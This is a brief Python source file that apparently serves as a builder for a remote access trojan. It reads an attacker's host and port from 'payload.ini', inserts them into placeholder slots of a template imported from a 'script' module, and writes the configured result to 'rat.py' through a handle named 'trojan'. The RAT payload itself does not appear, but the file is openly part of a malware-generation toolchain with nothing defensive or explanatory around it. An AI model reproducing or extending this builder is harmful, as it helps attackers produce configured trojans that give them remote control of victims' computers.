import configparser
def ScriptConfig():
    conf=configparser.ConfigParser()
    conf.read('payload.ini')
    payload=__import__("script")
    export=payload.script.replace(
        "[host!]","'"+conf.get('HostSection','Host')+"'"
    ).replace(
        "[port!]",conf.get('PortSection','Port')
    )
    with open("rat.py","w") as trojan:
        trojan.write(export)
        return trojan.name
    

    